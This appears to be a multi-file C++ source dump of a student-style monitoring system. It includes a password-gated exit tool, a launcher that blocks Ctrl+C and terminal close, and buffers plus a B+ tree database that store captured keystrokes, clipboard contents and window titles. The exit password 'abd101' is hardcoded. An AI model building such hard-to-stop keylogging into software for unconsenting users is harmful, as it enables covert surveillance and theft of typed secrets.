    // Find client process
      string cmd_client = "pgrep -f './client.*--guardian' 2>/dev/null";
    pipe = popen(cmd_client.c_str(), "r");
    if (pipe) {
        char buffer[128];
        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
            pids.push_back(  stoi(buffer));
        }
        pclose(pipe);
    }
    
    return pids;
}

int main(int argc, char* argv[]) {
      cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" <<   endl;
      cout << "â•‘     GUARDIAN EXIT TOOL                â•‘" <<   endl;
      cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n" <<   endl;
    
    // Find all related processes
      vector<pid_t> pids = findAllProcesses();
    
    if (pids.empty()) {
          cerr << "âŒ No launcher or client processes found!" <<   endl;
          cerr << "   Make sure the protected client is running." <<   endl;
        return 1;
    }
    
      cout << "âœ“ Found " << pids.size() << " process(es) to terminate:" <<   endl;
    for (pid_t pid : pids) {
          cout << "  - PID: " << pid <<   endl;
    }
    
      cout << "\nðŸ” Enter password to stop monitoring: " <<   flush;
    
      string password = getPasswordInput();
      cout <<   endl;
    
    // Hardcoded password check (CHANGE THIS to match launcher_common.hpp!)
    if (password == "abd101") {
          cout << "\nâœ… Password correct - Sending termination signal..." <<   endl;
        
        int killed_count = 0;
        int failed_count = 0;
        
        for (pid_t pid : pids) {
            if (kill(pid, SIGKILL) == 0) {
                  cout << "âœ… Terminated process PID: " << pid <<   endl;
                killed_count++;
            } else {
                  cerr << "âš ï¸  Failed to terminate PID " << pid << ": " << strerror(errno) <<   endl;
                failed_count++;
            }
        }
        
          cout << "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”" <<   endl;
          cout << "âœ… Successfully killed: " << killed_count << " process(es)" <<   endl;
        if (failed_count > 0) {
              cout << "âš ï¸  Failed to kill: " << failed_count << " process(es)" <<   endl;
              cout << "   Try running with: sudo ./guardian_exit" <<   endl;
        }
          cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n" <<   endl;
        
        return (failed_count > 0) ? 1 : 0;
    } else {
          cout << "\nâŒ INCORRECT PASSWORD!" <<   endl;
          cout << "   Exit denied. Monitoring continues..." <<   endl;
        return 1;
    }
}

===== FILE: ./guardian_exit_windows.cpp =====

#ifdef _WIN32

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <conio.h>
using namespace std; 
  string getPasswordInput() {
      string password;
    char ch;
    
    while (true) {
        ch = _getch();
        
        if (ch == '\r' || ch == '\n') { // Enter key
            break;
        } else if (ch == '\b' || ch == 127) { // Backspace
            if (!password.empty()) {
                password.pop_back();
                  cout << "\b \b"; // Erase character from display
            }
        } else if (ch >= 32 && ch <= 126) { // Printable characters only
            password += ch;
              cout << '*'; // Show asterisk
        }
    }
    
    return password;
}

  vector<DWORD> findAllProcesses() {
      vector<DWORD> pids;
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return pids;
    }
    
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(snapshot, &processEntry)) {
        do {
              string exeName = processEntry.szExeFile;
            
            // Find launcher.exe and client.exe processes
            if (exeName == "launcher.exe" || exeName == "client.exe") {
                pids.push_back(processEntry.th32ProcessID);
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    
    CloseHandle(snapshot);
    return pids;
}

int main(int argc, char* argv[]) {
      cout << "\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" <<   endl;
      cout << "â•‘     GUARDIAN EXIT TOOL (Windows)      â•‘" <<   endl;
      cout << "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n" <<   endl;
    
    // Find all related processes
      vector<DWORD> pids = findAllProcesses();
    
    if (pids.empty()) {
          cerr << "âŒ No launcher or client processes found!" <<   endl;
          cerr << "   Make sure the protected client is running." <<   endl;
          cout << "\nPress any key to exit...";
        _getch();
        return 1;
    }
    
      cout << "âœ“ Found " << pids.size() << " process(es) to terminate:" <<   endl;
    for (DWORD pid : pids) {
          cout << "  - PID: " << pid <<   endl;
    }
    
      cout << "\nðŸ” Enter password to stop monitoring: ";
    
      string password = getPasswordInput();
      cout <<   endl;
    
    // Hardcoded password check (CHANGE THIS to match launcher_common.hpp!)
    if (password == "abd101") {
          cout << "\nâœ… Password correct - Sending termination signal..." <<   endl;
        
        int killed_count = 0;
        int failed_count = 0;
        
        for (DWORD pid : pids) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (hProcess != NULL) {
                if (TerminateProcess(hProcess, 0)) {
                      cout << "âœ… Terminated process PID: " << pid <<   endl;
                    killed_count++;
                } else {
                      cerr << "âš ï¸  Failed to terminate PID " << pid << ": Error " << GetLastError() <<   endl;
                    failed_count++;
                }
                CloseHandle(hProcess);
            } else {
                  cerr << "âš ï¸  Failed to open PID " << pid << ": Error " << GetLastError() <<   endl;
                failed_count++;
            }
        }
        
          cout << "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”" <<   endl;
          cout << "âœ… Successfully killed: " << killed_count << " process(es)" <<   endl;
        if (failed_count > 0) {
              cout << "âš ï¸  Failed to kill: " << failed_count << " process(es)" <<   endl;
              cout << "   Try running as Administrator" <<   endl;
        }
          cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n" <<   endl;
        
          cout << "Press any key to exit...";
        _getch();
        return (failed_count > 0) ? 1 : 0;
    } else {
          cout << "\nâŒ INCORRECT PASSWORD!" <<   endl;
          cout << "   Exit denied. Monitoring continues..." <<   endl;
          cout << "\nPress any key to exit...";
        _getch();
        return 1;
    }
}

#endif // _WIN32

===== FILE: ./launcher_linux.cpp =====

#include "platform_detector.hpp"

#ifdef PLATFORM_LINUX

#include "launcher_common.hpp"
#include "process_guard_linux.hpp"
#include <iostream>
#include <string>
using namespace std; 
void printUsage() {
      cout << "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" <<   endl;
      cout << "     PROTECTED CLIENT LAUNCHER (Linux)                " <<   endl;
      cout << "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" <<   endl;
      cout << "Usage: ./launcher <server_ip> <port> <client_id>" <<   endl;
      cout << "Example: ./launcher 192.168.1.50 8080 bscs24009" <<   endl;
      cout << "\nFeatures:" <<   endl;
      cout << "  âœ“ Exit protection (password required)" <<   endl;
      cout << "  âœ“ Ctrl+C interception" <<   endl;
      cout << "  âœ“ Signal handler protection" <<   endl;
      cout << "  âœ“ Terminal close protection" <<   endl;
      cout << "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" <<   endl;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printUsage();
        return 1;
    }

      string server_ip = argv[1];
      string port = argv[2];
      string client_id = argv[3];

      cout << "\nðŸš€ PROTECTED CLIENT LAUNCHER" <<   endl;
      cout << "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n" <<   endl;
      cout << "Target Server: " << server_ip << ":" << port <<   endl;
      cout << "Client ID: " << client_id <<   endl;
      cout << "Protection: ACTIVE ðŸ›¡ï¸\n" <<   endl;

    // Assume client binary is in the same directory
      string client_exe = "./client";
      string client_args = server_ip + " " + port + " " + client_id + " --guardian";

    try {
        LauncherConfig config(client_exe, server_ip,   stoi(port), client_id);
        ProcessGuardLinux guard(config.exit_authorized);

        if (!guard.launchClient(client_exe, client_args)) {
              cerr << "âŒ Failed to launch protected client" <<   endl;
            return 1;
        }

        // Monitor the client process
        guard.monitorProcess();

          cout << "\nâœ… Guardian shutdown complete" <<   endl;

    } catch (const   exception& e) {
          cerr << "âŒ Error: " << e.what() <<   endl;
        return 1;
    }

    return 0;
}

#endif // PLATFORM_LINUX

===== FILE: ./event_buffers.hpp =====

#ifndef EVENT_BUFFERS_HPP
#define EVENT_BUFFERS_HPP

#include "db_structures.hpp"
#include "meowkey_database.hpp"
#include <vector>
#include <mutex>
#include <iostream>
#include <algorithm>

using namespace std;

// Keystroke buffer (50 events, flush at 25)
class KeystrokeBuffer {
private:
    vector<KeystrokeEvent> buffer_;
    mutable mutex mutex_;  // Changed to mutable
    uint32_t client_hash_;
    uint32_t sequence_;
    MeowKeyDatabase* db_;
    
    static constexpr size_t MAX_SIZE = 50;
    static constexpr size_t FLUSH_AT = 25;
    
public:
    KeystrokeBuffer(uint32_t client_hash, MeowKeyDatabase* db) 
        : client_hash_(client_hash), sequence_(0), db_(db) {
        buffer_.reserve(MAX_SIZE);
    }
    
    void add(uint64_t timestamp, const string& key) {
        bool should_flush = false;
        
        {
            lock_guard<mutex> lock(mutex_);
            buffer_.emplace_back(timestamp, client_hash_, sequence_++, key);
            should_flush = (buffer_.size() >= FLUSH_AT);
        }
        
        // Call flush OUTSIDE the lock to avoid deadlock
        if (should_flush) {
            flush();
        }
    }
    
    void flush() {
        lock_guard<mutex> lock(mutex_);
        
        if (buffer_.empty()) return;
        
        // Flush 50% (25 events)
        size_t flush_count = min(buffer_.size(), FLUSH_AT);
        
        cout << "  Flushing " << flush_count << " keystrokes..." << endl;
        cout.flush();
        
        for (size_t i = 0; i < flush_count; i++) {
            db_->insertKeystroke(client_hash_, buffer_[i]);
        }
        
        // Remove flushed events
        buffer_.erase(buffer_.begin(), buffer_.begin() + flush_count);
        
        cout << "  Keystroke flush completed. Buffer size: " << buffer_.size() << endl;
        cout.flush();
    }
    
    size_t size() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size(); 
    }
    
    bool needsFlush() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size() >= FLUSH_AT; 
    }
};

// Clipboard buffer (5 events, flush at 3)
class ClipboardBuffer {
private:
    vector<ClipboardEvent> buffer_;
    mutable mutex mutex_;  // Changed to mutable
    uint32_t client_hash_;
    MeowKeyDatabase* db_;
    
    static constexpr size_t MAX_SIZE = 5;
    static constexpr size_t FLUSH_AT = 3;
    
public:
    ClipboardBuffer(uint32_t client_hash, MeowKeyDatabase* db) 
        : client_hash_(client_hash), db_(db) {
        buffer_.reserve(MAX_SIZE);
    }
    
    void add(uint64_t timestamp, const string& content) {
        bool should_flush = false;
        
        {
            lock_guard<mutex> lock(mutex_);
            buffer_.emplace_back(timestamp, client_hash_, content);
            should_flush = (buffer_.size() >= FLUSH_AT);
        }
        
        if (should_flush) {
            flush();
        }
    }
    
    void flush() {
        lock_guard<mutex> lock(mutex_);
        
        if (buffer_.empty()) return;
        
        // Flush 60% (3 events)
        size_t flush_count = min(buffer_.size(), FLUSH_AT);
        
        cout << "  Flushing " << flush_count << " clipboard events..." << endl;
        cout.flush();
        
        for (size_t i = 0; i < flush_count; i++) {
            db_->insertClipboard(client_hash_, buffer_[i]);
        }
        
        buffer_.erase(buffer_.begin(), buffer_.begin() + flush_count);
        
        cout << "  Clipboard flush completed. Buffer size: " << buffer_.size() << endl;
        cout.flush();
    }
    
    size_t size() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size(); 
    }
    
    bool needsFlush() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size() >= FLUSH_AT; 
    }
};

// Window buffer (10 events, flush at 5)
class WindowBuffer {
private:
    vector<WindowEvent> buffer_;
    mutable mutex mutex_;  // Changed to mutable
    uint32_t client_hash_;
    MeowKeyDatabase* db_;
    
    static constexpr size_t MAX_SIZE = 10;
    static constexpr size_t FLUSH_AT = 5;
    
public:
    WindowBuffer(uint32_t client_hash, MeowKeyDatabase* db) 
        : client_hash_(client_hash), db_(db) {
        buffer_.reserve(MAX_SIZE);
    }
    
    void add(uint64_t timestamp, const string& title, const string& process) {
        bool should_flush = false;
        
        {
            lock_guard<mutex> lock(mutex_);
            buffer_.emplace_back(timestamp, client_hash_, title, process);
            should_flush = (buffer_.size() >= FLUSH_AT);
        }
        
        if (should_flush) {
            flush();
        }
    }
    
    void flush() {
        lock_guard<mutex> lock(mutex_);
        
        if (buffer_.empty()) return;
        
        // Flush 50% (5 events)
        size_t flush_count = min(buffer_.size(), FLUSH_AT);
        
        cout << "  Flushing " << flush_count << " window events..." << endl;
        cout.flush();
        
        for (size_t i = 0; i < flush_count; i++) {
            db_->insertWindow(client_hash_, buffer_[i]);
        }
        
        buffer_.erase(buffer_.begin(), buffer_.begin() + flush_count);
        
        cout << "  Window flush completed. Buffer size: " << buffer_.size() << endl;
        cout.flush();
    }
    
    size_t size() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size(); 
    }
    
    bool needsFlush() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size() >= FLUSH_AT; 
    }
};

// Client session with all buffers
class ClientSession {
private:
    string client_id_;
    uint32_t client_hash_;
    bool is_active_;
    
    KeystrokeBuffer keystroke_buffer_;
    ClipboardBuffer clipboard_buffer_;
    WindowBuffer window_buffer_;
    
public:
    ClientSession(const string& client_id, MeowKeyDatabase* db) 
        : client_id_(client_id), 
          client_hash_(ClientRecord::hashString(client_id)),
          is_active_(true),
          keystroke_buffer_(client_hash_, db),
          clipboard_buffer_(client_hash_, db),
          window_buffer_(client_hash_, db) {}
    
    void addKeystroke(uint64_t timestamp, const string& key) {
        keystroke_buffer_.add(timestamp, key);
    }
    
    void addClipboard(uint64_t timestamp, const string& content) {
        clipboard_buffer_.add(timestamp, content);
    }
    
    void addWindow(uint64_t timestamp, const string& title, const string& process) {
        window_buffer_.add(timestamp, title, process);
    }
     bool needsKeystrokeFlush() const {
        // Check through keystroke_buffer_
        return keystroke_buffer_.needsFlush();
    }
    
    bool needsClipboardFlush() const {
        return clipboard_buffer_.needsFlush();
    }
    
    bool needsWindowFlush() const {
        return window_buffer_.needsFlush();
    }
    
    void flushKeystrokes() {
        keystroke_buffer_.flush();
    }
    
    void flushClipboard() {
        clipboard_buffer_.flush();
    }
    
    void flushWindows() {
        window_buffer_.flush();
    }
    void flushAll() {
        cout << "Flushing all buffers for client: " << client_id_ << endl;
        cout.flush();
        keystroke_buffer_.flush();
        clipboard_buffer_.flush();
        window_buffer_.flush();
        cout << "All buffers flushed for client: " << client_id_ << endl;
        cout.flush();
    }
    
    const string& getClientId() const { return client_id_; }
    uint32_t getClientHash() const { return client_hash_; }
    bool isActive() const { return is_active_; }
    void setActive(bool active) { is_active_ = active; }
    
    void printBufferStatus() const {
        cout << "Client: " << client_id_ << endl;
        cout << "  Keystrokes: " << keystroke_buffer_.size() << "/50" << endl;
        cout << "  Clipboard: " << clipboard_buffer_.size() << "/5" << endl;
        cout << "  Windows: " << window_buffer_.size() << "/10" << endl;
        cout.flush();
    }
};

#endif

===== FILE: ./meowkey_database.hpp =====



#ifndef MEOWKEY_DATABASE_HPP
#define MEOWKEY_DATABASE_HPP

#include "db_structures.hpp"
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unordered_map>
#include <vector>
#include <iostream>
#include <chrono>
#include <stack>
#include <mutex>
#include <string>
#include <cstring>
#include <errno.h>
#include <algorithm>

using namespace std;

struct QueryResult
{
    vector<KeystrokeEvent> keystrokes;
    vector<ClipboardEvent> clipboard_events;
    vector<WindowEvent> window_events;

    size_t totalEvents() const
    {
        return keystrokes.size() + clipboard_events.size() + window_events.size();
    }
};

class MeowKeyDatabase
{
private:
    string filename_;
    int fd_;
    DatabaseHeader header_;

    static const size_t HASH_TABLE_SIZE = 1024;
    uint64_t hash_table_offset_;

    unordered_map<string, ClientRecord> client_cache_;
    stack<uint64_t> free_data_blocks_;
    stack<uint64_t> free_bplus_nodes_;

    mutable std::recursive_mutex db_mutex_;
    mutable mutex cache_mutex_;



  void reclaimBPlusTreeNodesOnlyLocked(uint64_t root_offset)
    {
        if (root_offset == 0)
            return;

        // Use iterative approach with a stack to avoid stack overflow
        vector<uint64_t> node_stack;
        node_stack.push_back(root_offset);

        int nodes_freed = 0;
        
        while (!node_stack.empty())
        {
            uint64_t current_offset = node_stack.back();
            node_stack.pop_back();

            if (current_offset == 0)
                continue;

            BPlusTreeNode node;
            if (!readNodeLocked(current_offset, node))
            {
                // Skip corrupted/invalid nodes
                continue;
            }

            // Add children to stack (internal nodes)
            if (!node.is_leaf)
            {
                for (uint32_t i = 0; i <= node.num_keys; ++i)
                {
                    if (node.children[i] != 0)
                    {
                        node_stack.push_back(node.children[i]);
                    }
                }
            }
            else
            {
                // For leaf nodes, add next leaf in chain
                if (node.next_leaf != 0)
                {
                    node_stack.push_back(node.next_leaf);
                }
            }

            // Mark this node as free
            free_bplus_nodes_.push(current_offset);
            nodes_freed++;
            
            // Periodically log progress for large deletions
            if (nodes_freed % 100 == 0)
            {
                cout << "    Freed " << nodes_freed << " nodes..." << endl;
            }
        }

        if (nodes_freed > 0)
        {
            cout << "    Total nodes freed: " << nodes_freed << endl;
        }
    }


//  void reclaimBPlusTreeNodesOnlyLocked(uint64_t node_offset)
//     {
//         if (node_offset == 0)
//             return;
            
//         BPlusTreeNode node;
//         if (!readNodeLocked(node_offset, node))
//             return;

//         // If it's not a leaf, recursively free child nodes
//         if (!node.is_leaf)
//         {
//             for (uint32_t i = 0; i <= node.num_keys; ++i)
//             {
//                 if (node.children[i] != 0)
//                     reclaimBPlusTreeNodesOnlyLocked(node.children[i]);
//             }
//         }
//         else
//         {
//             // For leaf nodes, also free the next leaf in the chain
//             if (node.next_leaf != 0)
//                 reclaimBPlusTreeNodesOnlyLocked(node.next_leaf);
//         }

//         // Mark this node as free
//         free_bplus_nodes_.push(node_offset);
//     }


public:
    MeowKeyDatabase(const string &filename)
        : filename_(filename), fd_(-1) {}

    ~MeowKeyDatabase()
    {
        close();
    }

    static uint64_t getCurrentTimestamp()
    {
        return chrono::duration_cast<chrono::microseconds>(chrono::system_clock::now().time_since_epoch()).count();
    }

    bool open()
    {
        lock_guard<recursive_mutex> lock(db_mutex_);

        fd_ = ::open(filename_.c_str(), O_RDWR | O_CREAT, 0644);
        if (fd_ < 0)
        {
            cerr << "Failed to open database: " << filename_ << " errno=" << errno << endl;
            return false;
        }

        struct stat st;
        if (fstat(fd_, &st) != 0)
        {
            cerr << "fstat failed errno=" << errno << endl;
            ::close(fd_);
            fd_ = -1;
            return false;
        }

        if (st.st_size == 0)
        {
            if (!initializeDatabase())
            {
                ::close(fd_);
                fd_ = -1;
                return false;
            }
        }
        else
        {
            if (!readHeader())
            {
                cerr << "Failed to read database header" << endl;
                ::close(fd_);
                fd_ = -1;
                return false;
            }

            if (header_.magic != 0x4D454F57)
            {
                cerr << "Invalid magic number" << endl;
                ::close(fd_);
                fd_ = -1;
                return false;
            }
        }

        hash_table_offset_ = header_.client_table_offset;
        return true;
    }

    void close()
    {
        lock_guard<recursive_mutex> lock(db_mutex_);

        if (fd_ >= 0)
        {
            writeHeader();
            fsync(fd_);
            ::close(fd_);
            fd_ = -1;
        }
    }

    // void syncToDisk()
    // {
    //     lock_guard<recursive_mutex> lock(db_mutex_);
    //     writeHeader();
    //     if (fd_ >= 0)
    //     {
    //         fsync(fd_);
    //     }
    // }

    // In MeowKeyDatabase::syncToDisk()

    //     // void syncToDisk()
    //     // {
    //     //     lock_guard<recursive_mutex> lock(db_mutex_);
    //     //     cout << "ðŸ” [DEBUG] Writing header to offset 0, fd=" << fd_ << endl;
    //     //     writeHeader();
    //     //     if (fd_ >= 0)
    //     //     {
    //     //         fsync(fd_);
    //     //         // Check file size
    //     //         struct stat st;
    //     //         if (fstat(fd_, &st) == 0)
    //     //         {
    //     //             cout << "ðŸ’¾ [DEBUG] Database file size: " << st.st_size << " bytes" << endl;
    //     //         }
    //     //     }
    //     // }

    // void syncToDisk()
    // {
    //     lock_guard<recursive_mutex> lock(db_mutex_);

    //     if (fd_ < 0) {
    //         cerr << "âš ï¸ [WARN] Cannot sync - database file not open" << endl;
    //         return;
    //     }

    //     cout << "ðŸ” [DEBUG] Writing header to offset 0, fd=" << fd_ << endl;

    //     if (!writeHeader()) {
    //         cerr << "âŒ Failed to write header in syncToDisk()" << endl;
    //     }

    //     if (fd_ >= 0) {
    //         fsync(fd_);
    //         // Check file size
    //         struct stat st;
    //         if (fstat(fd_, &st) == 0) {
    //             cout << "ðŸ’¾ [DEBUG] Database file size: " << st.st_size << " bytes" << endl;
    //         }
    //     }
    // }

    void syncToDisk()
    {
        lock_guard<recursive_mutex> lock(db_mutex_);

        if (fd_ < 0)
        {
            // Quietly skip if DB already closed
            return;
        }

        cout << "ðŸ” [DEBUG] Writing header to offset 0, fd=" << fd_ << endl;

        if (!writeHeader())
        {
            cerr << "âŒ Failed to write header in syncToDisk()" << endl;
            return;
        }

        fsync(fd_);
        struct stat st;
        if (fstat(fd_, &st) == 0)
        {
            cout << "ðŸ’¾ [DEBUG] Database file size: " << st.st_size << " bytes" << endl;
        }
    }

    bool registerClient(const string &client_id, ClientRecord &record)
    {
        lock_guard<recursive_mutex> lock(db_mutex_);

        // Try cache first
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            auto it = client_cache_.find(client_id);
            if (it != client_cache_.end() && !it->second.isEmpty())
            {
                record = it->second;
                record.is_active = 1;
                record.session_count++;
                record.last_seen = getCurrentTimestamp();
                saveClientRecordNoLock(record);
                client_cache_[client_id] = record;
                cout << "âœ“ Loaded existing client: " << client_id << " (sessions: " << record.session_count << ")" << endl;
                return true;
            }
        }

        // Try disk
        ClientRecord disk_record;
        if (loadClientRecordNoLock(client_id, disk_record))
        {
            // Found on disk - check if it's marked as deleted
            if (!disk_record.isEmpty())
            {
                record = disk_record;
                record.is_active = 1;
                record.session_count++;
                record.last_seen = getCurrentTimestamp();
                saveClientRecordNoLock(record);
                {
                    lock_guard<mutex> c_lock(cache_mutex_);
                    client_cache_[client_id] = record;
                }
                cout << "âœ“ Loaded existing client (disk): " << client_id << " (sessions: " << record.session_count << ")" << endl;
                return true;
            }
        }

        // Create new client (only if not found anywhere)
        record = ClientRecord();
        record.setClientId(client_id);
        record.is_active = 1;
        record.session_count = 1;
        record.first_seen = getCurrentTimestamp();
        record.last_seen = record.first_seen;

        // Allocate B+ tree roots
        record.keystroke_tree_root = allocateNodeLocked();
        record.clipboard_tree_root = allocateNodeLocked();
        record.window_tree_root = allocateNodeLocked();

        initializeBPlusTreeRootLocked(record.keystroke_tree_root);
        initializeBPlusTreeRootLocked(record.clipboard_tree_root);
        initializeBPlusTreeRootLocked(record.window_tree_root);

        saveClientRecordNoLock(record);
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            client_cache_[client_id] = record;
        }

        header_.num_clients++;
        writeHeader();

        cout << "âœ“ New client registered: " << client_id << endl;
        return false;
    }

    void deactivateClient(const string &client_id)
    {
        lock_guard<recursive_mutex> lock(db_mutex_);

        ClientRecord record;
        if (!loadClientRecordNoLock(client_id, record))
        {
            cerr << "Client " << client_id << " not found for deactivation" << endl;
            return;
        }

        if (record.isEmpty())
        {
            cerr << "Client " << client_id << " is already marked as deleted" << endl;
            return;
        }

        record.is_active = 0;
        record.last_seen = getCurrentTimestamp();

        saveClientRecordNoLock(record);

        {
            lock_guard<mutex> c_lock(cache_mutex_);
            client_cache_[client_id] = record;
        }

        writeHeader();
        cout << "âœ“ Client deactivated: " << client_id << endl;
    }


bool deleteClient(const string &client_id)
{
    lock_guard<recursive_mutex> lock(db_mutex_);

    ClientRecord record;
    if (!loadClientRecordNoLock(client_id, record))
    {
        cerr << "Client " << client_id << " not found for deletion" << endl;
        return false;
    }

    if (record.isEmpty())
    {
        cerr << "Client " << client_id << " is already marked as deleted" << endl;
        return false;
    }

    cout << "ðŸ—‘ï¸  Deleting client: " << client_id << endl;
    cout << "  Data: KS=" << record.total_keystrokes 
         << ", CB=" << record.total_clipboard 
         << ", W=" << record.total_windows << endl;

    // CRITICAL: Remove from hash table and cache FIRST
    // This prevents anyone from trying to access the client while we're deleting
    cout << "  Removing from hash table and cache..." << endl;
    removeClientFromHashTableLocked(client_id);
    
    {
        lock_guard<mutex> c_lock(cache_mutex_);
        client_cache_.erase(client_id);
    }

    // Update header BEFORE reclaiming space
    if (header_.num_clients > 0)
        header_.num_clients--;
    
    writeHeader();
    fsync(fd_);

    // NOW it's safe to reclaim the tree space
    cout << "  Reclaiming keystroke tree..." << endl;
    reclaimBPlusTreeNodesOnlyLocked(record.keystroke_tree_root);
    
    cout << "  Reclaiming clipboard tree..." << endl;
    reclaimBPlusTreeNodesOnlyLocked(record.clipboard_tree_root);
    
    cout << "  Reclaiming window tree..." << endl;
    reclaimBPlusTreeNodesOnlyLocked(record.window_tree_root);

    cout << "âœ… Client deleted and space reclaimed: " << client_id << endl;
    return true;
}

// bool deleteClient(const string &client_id)
// {
//     lock_guard<recursive_mutex> lock(db_mutex_);

//     ClientRecord record;
//     if (!loadClientRecordNoLock(client_id, record))
//     {
//         cerr << "Client " << client_id << " not found for deletion" << endl;
//         return false;
//     }

//     if (record.isEmpty())
//     {
//         cerr << "Client " << client_id << " is already marked as deleted" << endl;
//         return false;
//     }

//     // FIXED: Reclaim B+ tree space WITHOUT iterating through data
//     // Just mark the tree nodes as free, don't try to read the data
//     reclaimBPlusTreeNodesOnlyLocked(record.keystroke_tree_root);
//     reclaimBPlusTreeNodesOnlyLocked(record.clipboard_tree_root);
//     reclaimBPlusTreeNodesOnlyLocked(record.window_tree_root);

//     // Remove from hash table
//     removeClientFromHashTableLocked(client_id);

//     // Remove from cache
//     {
//         lock_guard<mutex> c_lock(cache_mutex_);
//         client_cache_.erase(client_id);
//     }

//     if (header_.num_clients > 0)
//         header_.num_clients--;

//     writeHeader();
//     fsync(fd_);
//     cout << "âœ“ Client deleted and space reclaimed: " << client_id << endl;
//     return true;
// }


    // bool deleteClient(const string &client_id)
    // {
    //     lock_guard<recursive_mutex> lock(db_mutex_);

    //     ClientRecord record;
    //     if (!loadClientRecordNoLock(client_id, record))
    //     {
    //         cerr << "Client " << client_id << " not found for deletion" << endl;
    //         return false;
    //     }

    //     if (record.isEmpty())
    //     {
    //         cerr << "Client " << client_id << " is already marked as deleted" << endl;
    //         return false;
    //     }

    //     // Reclaim all B+ tree space and associated data blocks
    //     reclaimBPlusTreeSpaceLocked(record.keystroke_tree_root);
    //     reclaimBPlusTreeSpaceLocked(record.clipboard_tree_root);
    //     reclaimBPlusTreeSpaceLocked(record.window_tree_root);

    //     // FIXED: Remove from hash table properly
    //     removeClientFromHashTableLocked(client_id);

    //     // Remove from cache
    //     {
    //         lock_guard<mutex> c_lock(cache_mutex_);
    //         client_cache_.erase(client_id);
    //     }

    //     if (header_.num_clients > 0)
    //         header_.num_clients--;

    //     writeHeader();
    //     fsync(fd_);
    //     cout << "âœ“ Client deleted and space reclaimed: " << client_id << endl;
    //     return true;
    // }


   

    void insertKeystroke(uint32_t client_hash, const KeystrokeEvent &event)
    {
        ClientRecord record;
        bool found = false;
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            for (const auto &p : client_cache_)
            {
                if (p.second.client_hash == client_hash && !p.second.isEmpty())
                {
                    record = p.second;
                    found = true;
                    break;
                }
            }
        }

        if (!found)
        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (!findClientByHashNoLock(client_hash, record))
            {
                cerr << "ERROR: Client not found for hash: " << client_hash << endl;
                return;
            }
            {
                lock_guard<mutex> c_lock(cache_mutex_);
                client_cache_[string(record.client_id)] = record;
            }
        }

        if (record.isEmpty())
        {
            cerr << "ERROR: Client with hash " << client_hash << " is marked as deleted" << endl;
            return;
        }

        uint64_t data_offset;
        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (!free_data_blocks_.empty())
            {
                data_offset = free_data_blocks_.top();
                free_data_blocks_.pop();
            }
            else
            {
                data_offset = header_.next_free_offset;
                header_.next_free_offset += sizeof(event);
            }

            if (pwrite(fd_, &event, sizeof(event), (off_t)data_offset) != (ssize_t)sizeof(event))
            {
                cerr << "ERROR: Failed to write keystroke data errno=" << errno << endl;
                return;
            }
            writeHeader();
        }

        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (record.keystroke_tree_root == 0)
            {
                record.keystroke_tree_root = allocateNodeLocked();
                initializeBPlusTreeRootLocked(record.keystroke_tree_root);
            }
            insertIntoBPlusTreeLocked(record.keystroke_tree_root, event.timestamp, data_offset);
            uint64_t new_root = getCurrentRootLocked(record.keystroke_tree_root);
            if (new_root != record.keystroke_tree_root)
                record.keystroke_tree_root = new_root;

            record.total_keystrokes++;
